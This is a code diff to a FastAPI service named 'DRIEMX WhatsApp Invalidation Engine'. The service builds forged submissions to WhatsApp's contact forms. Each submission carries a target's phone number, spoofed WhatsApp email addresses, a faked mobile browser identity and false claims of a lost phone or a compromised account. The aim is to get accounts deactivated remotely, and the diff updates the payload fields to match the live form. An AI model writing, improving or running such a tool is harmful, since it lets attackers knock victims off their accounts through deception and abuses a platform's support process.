@@ -3,7 +3,7 @@ from fastapi.middleware.cors import CORSMiddleware
 import httpx
 import asyncio
 
-app = FastAPI(title="DRIEMX WhatsApp Invalidation Engine", version="5.0")
+app = FastAPI(title="DRIEMX WhatsApp Invalidation Engine", version="5.1")
 
 app.add_middleware(
     CORSMiddleware,
@@ -19,21 +19,26 @@ SUPPORT_ENDPOINTS = [
         "url": "https://www.whatsapp.com/contact/noclient/",
         "method": "POST",
         "payload_func": lambda phone: {
-            "field_1": phone,
-            "field_2": "support@support.whatsapp.com",
-            "question": "lost_phone",
-            "support_select": "Stolen/Lost: Deactivate my account",
-            "lang": "es"
+            "imei": "",
+            "lg": "es",
+            "email": "support@support.whatsapp.com",
+            "confirm_email": "support@support.whatsapp.com",
+            "platform": "ANDROID",
+            "phone_number": phone,
+            "message": f"Perdida de telefono, desactivar cuenta {phone}"
         }
     },
     {
         "nombre": "WhatsApp_General_Support",
-        "url": "https://www.whatsapp.com/contact/",
+        "url": "https://www.whatsapp.com/contact/noclient/",
         "method": "POST",
         "payload_func": lambda phone: {
-            "phone": phone,
-            "topic": "deactivate",
-            "message": f"Please deactivate account {phone} due to unauthorized access."
+            "lg": "es",
+            "email": "security@whatsapp.com",
+            "confirm_email": "security@whatsapp.com",
+            "platform": "ANDROID",
+            "phone_number": phone,
+            "message": f"Cuenta comprometida, cierre de sesion requerido para {phone}"
         }
     }
 ]
@@ -43,7 +48,7 @@ async def enviar_peticion_soporte(client, endpoint, telefono):
         "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
         "Content-Type": "application/x-www-form-urlencoded",
         "Origin": "https://www.whatsapp.com",
-        "Referer": "https://www.whatsapp.com/contact/"
+        "Referer": "https://www.whatsapp.com/contact/noclient/"
     }
     payload = endpoint["payload_func"](telefono)
     try:
